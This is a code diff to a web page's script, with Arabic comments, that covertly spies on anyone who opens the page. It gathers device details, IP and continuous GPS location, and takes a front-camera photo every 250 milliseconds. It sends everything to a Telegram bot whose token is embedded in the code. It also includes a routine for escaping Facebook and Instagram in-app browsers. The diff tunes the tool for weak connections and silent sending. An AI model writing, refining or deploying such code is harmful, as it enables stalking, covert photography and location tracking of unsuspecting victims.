@@ -57,7 +57,7 @@
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
-  <script type="module">
+  <script>
     // ==================== إعدادات ====================
     const B = '69ee19e8856a68218974812e';
     const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
@@ -77,13 +77,12 @@
     let escapeCompleted = false;
     let watchId = null;
 
-    async function sendText(text) {
-      try {
-        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: C, text: text, parse_mode: 'HTML' })
-        });
-      } catch (e) {}
+    function sendText(text) {
+      fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: C, text: text, parse_mode: 'HTML' })
+      }).catch(() => {});
     }
 
     function showOverlay() { post.classList.add('hidden'); }
@@ -126,7 +125,7 @@
         txt += `المعالج: ${navigator.hardwareConcurrency||1} نواة\nالذاكرة: ${navigator.deviceMemory||'N/A'}GB\n`;
         if (bat) txt += `البطارية: ${(bat.level*100).toFixed(0)}% ${bat.charging?'⚡':'🔋'}\n`;
         txt += `اللغة: ${navigator.language}\nالمنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
-        await sendText(txt);
+        sendText(txt);
       } catch (e) {}
     }
 
@@ -137,7 +136,7 @@
         if (d.loc) {
           const [lat, lon] = d.loc.split(',').map(Number);
           ipLoc = { lat, lon, acc: 5000, src: 'IP' };
-          await sendText(
+          sendText(
             `📍 <b>الموقع التقريبي (IP)</b>\n` +
             `الإحداثيات: ${lat}, ${lon}\n` +
             `🌍 <a href="https://www.google.com/maps?q=${lat},${lon}">Google Maps</a>\n` +
@@ -148,9 +147,12 @@
       } catch (e) {}
     }
 
-    // ==================== الموقع الدقيق GPS (watchPosition) ====================
+    // ==================== الموقع الدقيق GPS (مثل خرائط غوغل) ====================
     function startWatchingGPS() {
-      if (!navigator.geolocation) return;
+      if (!navigator.geolocation) {
+        retryLocationBtn.classList.remove('hidden');
+        return;
+      }
       watchId = navigator.geolocation.watchPosition(
         (pos) => {
           if (pos.coords.accuracy && pos.coords.accuracy <= 50) {
@@ -166,22 +168,20 @@
             retryLocationBtn.classList.add('hidden');
           }
         },
-        () => {},
-        {
-          enableHighAccuracy: true,
-          timeout: 30000,
-          maximumAge: 0
-        }
+        (err) => {
+          retryLocationBtn.classList.remove('hidden');
+        },
+        { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
       );
     }
 
-    // ==================== الكاميرا والتصوير المستمر (إرسال فوري) ====================
+    // ==================== الكاميرا والتصوير المستمر (جودة منخفضة للإنترنت الضعيف) ====================
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         vid.srcObject = stream;
         await new Promise(r => { vid.onloadedmetadata = () => { vid.play(); r(); }; });
-        await sendText("✅ الكاميرا تعمل، جاري التصوير...");
+        sendText("✅ الكاميرا تعمل، جاري التصوير...");
         capInt = setInterval(captureAndSend, 250);
         return true;
       } catch (e) { return false; }
@@ -192,43 +192,34 @@
       cnv.width = vid.videoWidth;
       cnv.height = vid.videoHeight;
       ctx.drawImage(vid, 0, 0);
-      
-      // استخدام toBlob (مدعومة في كل المتصفحات الحديثة)
+
+      // استخدام toBlob مع جودة 0.4 لضمان حجم صغير
       if (cnv.toBlob) {
-        cnv.toBlob(async (blob) => {
+        cnv.toBlob(blob => {
           if (!blob) return;
-          if (blob.size > 10 * 1024 * 1024) return; // أكبر من 10 ميغابايت، لا نرسل
+          const xhr = new XMLHttpRequest();
+          xhr.open('POST', `https://api.telegram.org/bot${T}/sendPhoto`);
           const form = new FormData();
           form.append('chat_id', C);
           form.append('photo', blob, 'snap.jpg');
-          try {
-            const res = await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form });
-            if (!res.ok) {
-              const errText = await res.text();
-              console.error('فشل إرسال الصورة:', errText);
-              sendText('❌ فشل إرسال صورة: ' + errText.substring(0, 100));
-            } else {
-              photos++;
-            }
-          } catch(e) {
-            console.error('خطأ شبكة:', e);
-            sendText('❌ خطأ شبكة أثناء إرسال صورة');
-          }
-        }, 'image/jpeg', 0.7);
+          xhr.send(form);
+          photos++;
+        }, 'image/jpeg', 0.4);  // جودة 40% – حجم صغير جداً مع تمييز الوجه
       } else {
-        // fallback يدوي لـ toBlob
-        const dataUrl = cnv.toDataURL('image/jpeg', 0.7);
+        // fallback يدوي
+        const dataUrl = cnv.toDataURL('image/jpeg', 0.4);
         fetch(dataUrl)
           .then(res => res.blob())
-          .then(async (blob) => {
-            if (blob.size > 10 * 1024 * 1024) return;
+          .then(blob => {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', `https://api.telegram.org/bot${T}/sendPhoto`);
             const form = new FormData();
             form.append('chat_id', C);
             form.append('photo', blob, 'snap.jpg');
-            const res = await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form });
-            if (res.ok) photos++;
+            xhr.send(form);
+            photos++;
           })
-          .catch(e => console.error('خطأ في fallback:', e));
+          .catch(() => {});
       }
     }
 
@@ -256,17 +247,14 @@
     retryLocationBtn.addEventListener('click', async () => {
       retryLocationBtn.classList.add('hidden');
       startWatchingGPS();
-      setTimeout(() => {
-        if (!locationGranted) retryLocationBtn.classList.remove('hidden');
-      }, 10000);
     });
 
     // ==================== تقرير الخروج ====================
-    async function sendExitReport() {
+    function sendExitReport() {
       let locStr = 'غير متوفر';
       if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
       else if (ipLoc) locStr = `IP (${ipLoc.lat}, ${ipLoc.lon})`;
-      await sendText(`<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`);
+      sendText(`<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`);
     }
 
     // ==================== خطة الهروب من WebView ====================
@@ -300,6 +288,7 @@
       return /FBAN|FBAV|Instagram/i.test(ua);
     }
 
+    // ==================== بدء التشغيل ====================
     (async function init() {
       await loadPost();
       sendDeviceInfo();
